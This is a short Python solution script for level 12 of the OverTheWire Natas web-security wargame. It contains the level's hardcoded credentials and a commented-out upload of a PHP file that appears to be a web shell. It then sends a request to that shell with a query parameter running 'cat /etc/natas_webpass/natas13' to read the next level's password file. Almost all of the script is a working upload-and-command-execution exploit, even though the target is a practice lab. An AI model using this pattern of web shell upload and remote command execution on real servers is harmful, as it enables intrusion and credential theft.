import requests
import re
username = "natas12"
password = "YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG"
url = "http://%s.natas.labs.overthewire.org/" %username



session = requests.Session()
# response = session.post(url,files={"uploadedfile":open("hello.php","rb")},data={"filename":"hello.php","MAX_FILE_SIZE":"1000"},auth=(username,password))

response = session.get(url+"upload/qluuub93pw.php?c=cat /etc/natas_webpass/natas13",auth=(username,password),)
content = response.text

print(content)
